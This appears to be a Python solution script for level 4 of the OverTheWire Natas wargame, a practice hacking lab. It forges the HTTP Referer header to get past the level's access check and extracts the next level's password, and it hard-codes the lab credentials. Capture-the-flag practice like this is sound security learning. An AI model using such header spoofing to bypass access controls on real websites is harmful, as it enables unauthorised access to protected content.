import requests as r 
import re

def auth(username, password, URL,headers):

     with r.session() as s:
        response = s.get(URL, auth =(username,password),headers=headers)
        content =response.text
        print(re.findall("The password for natas5 is (.*)", content)[0])


def headers():
    headers = {

        'Referer' :'http://natas5.natas.labs.overthewire.org/'
    }
    return headers

def main():
    username = 'natas4'
    password = 'tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm'
    URL = f"http://{username}.natas.labs.overthewire.org/"
    header= headers()
    results = auth(username,password,URL,header)

main()